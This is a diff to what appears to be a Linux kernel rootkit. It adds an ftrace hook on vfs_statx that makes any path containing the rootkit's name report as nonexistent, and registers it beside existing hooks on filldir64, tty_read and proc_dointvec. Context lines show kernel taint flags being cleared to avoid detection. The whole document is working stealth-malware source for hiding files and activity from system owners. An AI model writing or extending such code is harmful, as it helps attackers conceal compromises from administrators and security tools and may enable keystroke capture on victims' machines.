@@ -998,6 +998,22 @@ static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs
 }
 #endif
 
+static long (*real_vfs_statx)(int, const char __user *, int, struct kstat *, u32);
+static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask) {
+    /** size is more than enough for what is needed here. */
+    char kernbuf[PROCNAME_MAXLEN+6] = {0};
+
+    if (!copy_from_user((void*)kernbuf, filename, sizeof(kernbuf)-1)) {
+
+        /** we don't exist */
+        if (strstr(kernbuf, PROCNAME))
+            return -ENOENT;
+    }
+
+    /** return normal */
+    return real_vfs_statx(dfd, filename, flags, stat, request_mask);
+}
+
 /**
  * __x64 prefix is not always present
  */
@@ -1132,7 +1148,6 @@ struct kernel_syscalls *kv_kall_load_addr(void) {
         /** zero tainted_mask for the bits we care */
         ks.tainted = (unsigned long*)ks.k_kallsyms_lookup_name("tainted_mask");
 
-
         ks.k__set_task_comm = (do__set_task_comm_sg)ks.k_kallsyms_lookup_name("__set_task_comm");
         if (!ks.k__set_task_comm)
             prwarn("invalid data: __set_task_comm will not work\n");
@@ -1159,6 +1174,8 @@ static struct ftrace_hook ft_hooks[] = {
     {"filldir64", m_filldir64, &real_filldir64},
     {"tty_read", m_tty_read, &real_tty_read},
     {"proc_dointvec", m_proc_dointvec, &real_proc_dointvec},
+    {"vfs_statx", m_vfs_statx, &real_vfs_statx},
+
     {NULL, NULL, NULL},
 };
 
